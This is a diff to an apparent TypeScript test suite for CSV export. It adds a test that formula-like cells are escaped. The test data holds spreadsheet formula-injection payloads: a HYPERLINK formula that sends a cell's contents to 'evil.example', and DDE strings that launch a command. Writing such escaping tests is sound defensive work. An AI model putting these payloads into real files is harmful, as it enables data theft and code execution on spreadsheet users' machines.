@@ -15,7 +15,7 @@ import { mountViewer, type ViewerHandle, type ViewerOptions } from './viewer';
  */
 
 const contacts: Page = {
-  fieldia: '0.12',
+  fieldia: '0.13',
   id: 'contacts',
   title: 'Contacts',
   data: { kind: 'record', model: 'contact' },
@@ -327,6 +327,10 @@ describe('the file an export writes', () => {
   it('quotes in CSV only what needs it, a line break between rows, marked as UTF-8', () => {
     expect(csvOf([['a', 'b,c', 'd"e', ' f', 'g\nh']])).toBe('\ufeffa,"b,c","d""e"," f","g\nh"\r\n');
     expect(csvOf([['1,5', 'x;y']], ';')).toBe('\ufeff1,5;"x;y"\r\n');
+    // Words a spreadsheet would run as a formula stay words (S-M1, the audit's cells); a number the file means is a number.
+    expect(csvOf([['=HYPERLINK("https://evil.example/?d="&A3,"Open")', "+1+cmd|' /C calc'!A0"], ["@SUM(1+1)*cmd|' /C calc'!A0", '-2+3'], [{ number: '-2.50' }, '＝1']])).toBe(
+      `\ufeff"'=HYPERLINK(""https://evil.example/?d=""&A3,""Open"")",'+1+cmd|' /C calc'!A0\r\n'@SUM(1+1)*cmd|' /C calc'!A0,'-2+3\r\n-2.50,'＝1\r\n`
+    );
   });
 
   it('parts CSV values with a semicolon where the language writes a decimal comma', () => {
